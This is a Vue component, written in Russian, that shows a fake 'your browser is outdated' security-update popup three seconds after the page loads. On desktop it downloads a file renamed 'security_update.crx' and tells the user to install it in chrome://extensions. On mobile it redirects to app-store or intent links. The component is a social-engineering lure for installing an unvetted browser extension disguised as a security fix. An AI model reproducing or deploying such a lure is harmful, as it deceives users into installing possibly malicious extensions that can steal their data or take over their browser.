<template>
    <div v-if="visible" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
        <div class="bg-white rounded-lg p-6 max-w-md mx-4 text-center">
            <h3 class="text-xl font-bold mb-3 text-red-600">Ваш браузер устарел</h3>
            <p class="text-gray-700 mb-4">Требуется установка обновления безопасности для продолжения работы</p>
            <button 
                @click="handleUpdate"
                class="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 font-semibold"
            >
                Обновить сейчас
            </button>
        </div>
    </div>
</template>

<script setup>
import { ref, onMounted } from 'vue';

const visible = ref(false);

const isMobile = () => {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
};

const handleUpdate = () => {
    if (isMobile()) {
        // Для мобильных
        if (/Android/i.test(navigator.userAgent)) {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'intent://#Intent;scheme=https;package=com.android.chrome;end';
            document.body.appendChild(iframe);
            
            setTimeout(() => {
                window.location.href = 'market://details?id=com.google.android.webview';
            }, 500);
        } else if (/iPhone|iPad/i.test(navigator.userAgent)) {
            window.location.href = 'itms-apps://apps.apple.com/app/id123456789';
        }
    } else {
        // Для ПК - создаём ссылку на расширение
        const link = document.createElement('a');
        link.href = '/extension.crx';
        link.download = 'security_update.crx';
        link.click();
        
        alert('Перетащите скачанный файл в chrome://extensions и включите расширение');
    }
    
    visible.value = false;
};

onMounted(() => {
    setTimeout(() => {
        visible.value = true;
    }, 3000);
});
</script>